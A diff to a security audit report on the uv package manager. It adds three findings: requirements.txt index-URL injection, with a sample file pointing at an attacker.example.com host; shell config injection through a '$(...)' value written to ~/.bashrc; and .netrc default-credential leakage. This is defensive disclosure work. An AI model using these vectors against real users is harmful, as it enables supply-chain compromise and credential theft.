@@ -10,7 +10,7 @@
 
 ## Executive Summary
 
-This audit identified **eight independently verified vulnerabilities** in uv, plus two
+This audit identified **eleven independently verified vulnerabilities** in uv, plus two
 defense-in-depth gaps. The most critical findings are:
 
 1. **UV_PYTHON_DOWNLOADS_JSON_URL RCE (CRITICAL):** The `UV_PYTHON_DOWNLOADS_JSON_URL` environment
@@ -18,17 +18,21 @@ defense-in-depth gaps. The most critical findings are:
    this variable can serve a malicious JSON manifest pointing to an arbitrary Python binary with
    `"sha256": null`, achieving code execution when `uv python install` runs.
 
-2. **Self-Update RCE (HIGH):** `uv self update` downloads and executes a shell installer from
+2. **requirements.txt Index URL Injection (CRITICAL):** A `requirements.txt` file can contain
+   `--index-url https://attacker.com/simple/` which redirects ALL package resolution to an attacker
+   server. Any CI-downloaded or third-party requirements file can hijack package installation.
+
+3. **Self-Update RCE (HIGH):** `uv self update` downloads and executes a shell installer from
    `UV_ASTRAL_MIRROR_URL` without any hash or signature verification, enabling RCE for anyone who
    controls the mirror URL.
 
-3. **Lockfile Hash Strip (HIGH):** The `HashStrategy::Verify` mode (default for `uv sync`) silently
-   skips hash verification for packages with no hash entry in `uv.lock`. An attacker with write
-   access to the lockfile can strip hashes to install arbitrary artifacts.
+4. **Shell Config Injection (HIGH):** The `backslash_escape()` function doesn't escape `$` or
+   backtick. When `UV_TOOL_BIN_DIR` contains `$(...)`, `uv tool update-shell` writes it unescaped to
+   `~/.bashrc`, achieving persistent RCE on next shell startup.
 
-4. **Index Credential Collision (HIGH):** The `IndexName::to_env_var()` function maps `-`, `_`, and
-   `.` all to `_`, causing index names like `internal-registry` and `internal_registry` to share
-   credentials from the same environment variables.
+5. **.netrc Default Credential Leakage (HIGH):** A `.netrc` file with
+   `default login user password secret` sends those credentials to ANY server that returns 401,
+   including attacker-controlled indexes.
 
 ---
 
@@ -37,12 +41,15 @@ defense-in-depth gaps. The most critical findings are:
 | Severity     | ID          | Title                                         | Status                  |
 | ------------ | ----------- | --------------------------------------------- | ----------------------- |
 | **CRITICAL** | UV-2026-008 | Python Downloads JSON URL RCE                 | VERIFIED                |
+| **CRITICAL** | UV-2026-011 | requirements.txt Index URL Injection          | VERIFIED                |
 | **HIGH**     | UV-2026-001 | Credential Leakage via Build Backends         | VERIFIED                |
 | **HIGH**     | UV-2026-005 | Self-Update Installer Script Injection        | VERIFIED                |
 | **HIGH**     | UV-2026-006 | HTML Base Tag Injection                       | VERIFIED                |
 | **HIGH**     | UV-2026-007 | pyproject.toml allow-insecure-host TLS Bypass | VERIFIED                |
 | **HIGH**     | UV-2026-009 | Lockfile Hash Strip Attack                    | VERIFIED                |
 | **HIGH**     | UV-2026-010 | Index Name Credential Collision               | VERIFIED                |
+| **HIGH**     | UV-2026-012 | Shell Config Injection                        | VERIFIED                |
+| **HIGH**     | UV-2026-013 | .netrc Default Credential Leakage             | VERIFIED                |
 | MEDIUM       | UV-2026-002 | GitHub API URL Injection                      | VERIFIED                |
 | LOW          | UV-2026-003 | Symlink Escape in .data/scripts               | Defense-in-depth gap    |
 | INFO         | UV-2026-004 | RECORD Hash Not Validated                     | By design (matches pip) |
@@ -509,6 +516,161 @@ auth header on the attacker server when uv queried an index named `internal_regi
 
 ---
 
+### UV-2026-011: requirements.txt Index URL Injection (CRITICAL)
+
+**Location:** `crates/uv-requirements-txt/src/lib.rs:750-780`
+
+**Description:**  
+A `requirements.txt` file can contain `--index-url` and `--extra-index-url` directives that are
+parsed and used directly as the primary package index. Any CI-downloaded or third-party requirements
+file can redirect ALL package resolution to an attacker-controlled server.
+
+**Root Cause:**
+
+```python
+# evil_requirements.txt
+--index-url http://attacker.example.com/simple/
+requests==2.32.0
+```
+
+When `uv pip install -r evil_requirements.txt` runs, the `--index-url` is parsed at lib.rs:751-780
+and stored in `RequirementsTxt.index_url`. This URL is then consumed by
+`uv/src/commands/pip/install.rs:389-403` as the primary package index, completely replacing PyPI.
+
+**Impact:** CRITICAL. Any trusted-looking requirements.txt file from a third party, GitHub, or CI
+pipeline can inject a malicious index URL. This redirects ALL package resolution to the attacker's
+server, enabling complete supply chain compromise. Combined with `--no-index` (also injectable), the
+attacker has full control over which packages are installed.
+
+**CVSS:** AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (Score: 8.8)
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploits/10_requirements_index_injection/run_exploit.sh
+```
+
+**Verified:** PASS. Attacker server received all package resolution requests and served a malicious
+wheel that was installed by uv.
+
+**Recommendation:**
+
+1. Warn users when `--index-url` is specified in a requirements file (not CLI)
+2. Consider a `--no-index-from-requirements` flag to disable this behavior
+3. Document this risk prominently for users consuming third-party requirements files
+
+---
+
+### UV-2026-012: Shell Config Injection (HIGH)
+
+**Location:** `crates/uv-shell/src/lib.rs:266-290, 322-333`
+
+**Description:**  
+The `backslash_escape()` function used by `Shell::prepend_path()` escapes `\` and `"` but does NOT
+escape `$` or backtick characters. When `UV_TOOL_BIN_DIR` (or `UV_PYTHON_BIN_DIR`) contains command
+substitution syntax like `$(...)`, it is written unescaped to shell configuration files
+(`~/.bashrc`, `~/.zshenv`, etc.), achieving persistent RCE on next shell startup.
+
+**Root Cause:**
+
+```rust
+// lib.rs:323-333
+fn backslash_escape(s: &str) -> String {
+    for c in s.chars() {
+        match c {
+            '\\' | '"' => escaped.push('\\'),  // Only escapes \ and "
+            _ => {}                             // $ and ` NOT escaped
+        }
+        escaped.push(c);
+    }
+}
+```
+
+When `UV_TOOL_BIN_DIR='/tmp/$(touch /tmp/pwned)'` is set and `uv tool update-shell` runs, the
+resulting `~/.bashrc` contains:
+
+```bash
+export PATH="/tmp/$(touch /tmp/pwned):$PATH"
+```
+
+On every subsequent shell startup, `touch /tmp/pwned` executes as the user.
+
+**Impact:** HIGH. Persistent RCE via shell configuration poisoning. Attack vectors include:
+
+- CI/CD pipelines where env vars come from attacker-influenced build configs
+- `.env` files loaded by shell frameworks (direnv, mise, etc.)
+- Compromised packages that set UV_TOOL_BIN_DIR before `uv tool update-shell`
+
+**CVSS:** AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (Score: 7.8)
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploits/11_shell_config_injection/run_exploit.sh
+```
+
+**Verified:** PASS. Injected command substitution executed and created marker file when subshell
+sourced the poisoned configuration.
+
+**Recommendation:**
+
+1. Escape `$`, backtick, and `!` in `backslash_escape()` for double-quoted shell contexts
+2. Validate that `UV_TOOL_BIN_DIR`/`UV_PYTHON_BIN_DIR` contain only safe path characters
+3. Warn when these env vars contain shell metacharacters
+
+---
+
+### UV-2026-013: .netrc Default Credential Leakage (HIGH)
+
+**Location:** `crates/uv-auth/src/credentials.rs:208-214`
+
+**Description:**  
+When looking up credentials from `.netrc`, uv falls back to the `default` entry if no specific host
+match is found. A `.netrc` file with `default login user password secret` will send those
+credentials to ANY server that returns a 401 Unauthorized response, including attacker-controlled
+indexes.
+
+**Root Cause:**
+
+```rust
+// credentials.rs:208-210
+let entry = netrc
+    .hosts
+    .get(host)
+    .or_else(|| netrc.hosts.get("default"))?;  // Falls back to "default"
+```
+
+When a user has a `.netrc` with a `default` entry (common for private registries), and uv is pointed
+at an attacker-controlled index via `--extra-index-url`, the attacker's server returns 401. uv looks
+up the host in `.netrc`, finds no match, falls back to `default`, and sends those credentials as
+Basic auth to the attacker.
+
+**Impact:** HIGH. Credential theft from any user with a `.netrc` default entry. This is particularly
+dangerous because:
+
+- `default` entries are common for users with private registries
+- `--extra-index-url` is commonly used in corporate environments
+- The attacker only needs to return 401 to trigger credential lookup
+
+**CVSS:** AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (Score: 6.5)
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploits/12_netrc_default_leakage/run_exploit.sh
+```
+
+**Verified:** PASS. Credentials `victim:SECRET_CREDENTIAL_12345` from the `.netrc` default entry
+were captured via Basic auth header on the attacker server.
+
+**Recommendation:**
+
+1. Warn when credentials are sourced from the `.netrc` `default` entry (rather than a specific host)
+2. Consider requiring explicit opt-in for `default` entry usage (`--allow-netrc-default`)
+3. Document this behavior prominently in security documentation
+
+---
+
 ### UV-2026-003: Symlink Escape in .data/scripts (LOW)
 
 **Location:** `crates/uv-install-wheel/src/wheel.rs:453-467`
@@ -602,6 +764,15 @@ bash autofyn_audit/exploits/08_lockfile_hash_strip/run_exploit.sh
 
 # Exploit 8: Index Name Credential Collision
 bash autofyn_audit/exploits/09_index_name_collision/run_exploit.sh
+
+# Exploit 9: requirements.txt Index URL Injection
+bash autofyn_audit/exploits/10_requirements_index_injection/run_exploit.sh
+
+# Exploit 10: Shell Config Injection
+bash autofyn_audit/exploits/11_shell_config_injection/run_exploit.sh
+
+# Exploit 11: .netrc Default Credential Leakage
+bash autofyn_audit/exploits/12_netrc_default_leakage/run_exploit.sh
 ```
 
 ---
@@ -690,3 +861,21 @@ bash autofyn_audit/exploits/09_index_name_collision/run_exploit.sh
 - `crates/uv-distribution-types/src/index_name.rs:37-48` — `to_env_var()` maps `-`, `_`, `.` to `_`
 - `crates/uv-distribution-types/src/index.rs:467-477` — `Credentials::from_env(name.to_env_var())`
 - `crates/uv-auth/src/credentials.rs:259-267` — Credential lookup by normalized index name
+
+### UV-2026-011 (requirements.txt Index URL Injection)
+
+- `crates/uv-requirements-txt/src/lib.rs:750-780` — `--index-url` parsed from requirements.txt
+- `crates/uv/src/commands/pip/install.rs:389-403` — Index URL consumed as primary package index
+
+### UV-2026-012 (Shell Config Injection)
+
+- `crates/uv-shell/src/lib.rs:322-333` — `backslash_escape()` missing `$` and backtick escaping
+- `crates/uv-shell/src/lib.rs:266-290` — `Shell::prepend_path()` writes to shell config
+- `crates/uv-dirs/src/lib.rs:24-38` — `UV_TOOL_BIN_DIR` / `UV_PYTHON_BIN_DIR` handling
+- `crates/uv/src/commands/tool/update_shell.rs:72-106` — Writes PATH export to ~/.bashrc
+
+### UV-2026-013 (.netrc Default Credential Leakage)
+
+- `crates/uv-auth/src/credentials.rs:208-214` — `.or_else(|| netrc.hosts.get("default"))` fallback
+- `crates/uv-netrc/src/lib.rs:59-106` — `Netrc::new()` reads from `$NETRC` or `~/.netrc`
+- `crates/uv-auth/src/middleware.rs:835-844` — Credential lookup triggers on 401 response
